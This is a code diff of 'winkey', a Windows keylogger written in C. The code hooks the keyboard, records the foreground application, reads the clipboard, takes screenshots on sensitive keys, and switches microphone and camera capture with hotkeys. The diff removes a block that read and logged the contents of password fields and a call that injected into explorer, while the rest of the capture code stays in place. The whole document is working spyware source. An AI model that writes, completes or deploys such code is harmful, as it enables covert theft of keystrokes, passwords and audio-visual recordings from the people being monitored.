@@ -21,37 +21,37 @@ DWORD WINAPI thread_micro(LPVOID lp)
 }
 
 
-
-char *which_open(char *exe)
+DWORD which_open(char *exe)
 {
 	HWND hwnd = GetForegroundWindow();
 	DWORD pid = 0;
 
 	if (!hwnd)
-		return NULL;
+		return 0;
 	GetWindowThreadProcessId(hwnd, &pid);
 	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
 	if (!hProc)
-		return NULL;
+		return 0;
 	if (!GetModuleFileNameExA(hProc, NULL, exe, MAX_PATH))
 	{
 		CloseHandle(hProc);
-		return NULL;
+		return 0;
 	}
 	CloseHandle(hProc);
-	return exe;
+	return pid;
 }
 
 
 LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 {
 	static HWND last_window = NULL;
+
+
 	char exe[MAX_PATH] = {0};
 	char key[8] = {0};
 	char time[64];
 	char title[256] = {0};
 	char clip[1024];
-
 	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
 	{
 		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
@@ -64,20 +64,6 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 		}
 		if (is_sensitive_key(kbd->vkCode))
 			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\sensitive_key.bmp");
-		if (is_password_field(current))
-		{
-			capture_screen(L"C:\\Users\\marcc\\keylogger-Wind\\winkey\\screens\\password_field.bmp");
-			char pwd[256] = {0};
-			if (read_password_from_control(current, pwd, sizeof(pwd)))
-			{
-				FILE *fp = fopen("winkey.log", "a");
-				if (fp)
-				{
-					fprintf(fp, "[PASSWORD FIELD] -> %s\n", pwd);
-					fclose(fp);
-				}
-			}
-		}
 		if (kbd->vkCode == VK_F9)
 		{
 			printf("MICRO ACTIVE CHEF !\n:");
@@ -98,8 +84,8 @@ LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 			printf("CAMERA DESACTIVER CHEF\n");
 			g_camera_run = 0;
 		}
-		which_open(exe);
-		if (!allow_app(exe))
+		DWORD pid = which_open(exe);
+		if (!allow_app(exe, pid))
 			return (CallNextHookEx(g_ouk, ncode, wp, lp));
 		read_clipboard(clip, sizeof(clip));
 		get_time(time);
@@ -149,7 +135,7 @@ int run_winkey(void)
 		printf("Error: can't install the hook.\n");
 		return 1;
 	}
-	printf("winkey: hook install ;)");
+	printf("winkey: hook install ;)\n");
 	while(GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
@@ -165,7 +151,6 @@ int main(void)
 {
 	CreateThread(NULL, 0, thread_micro, NULL, 0, NULL);
 	//start_camera();
-	inject_into_explorer();
 	return (run_winkey());
 }
 
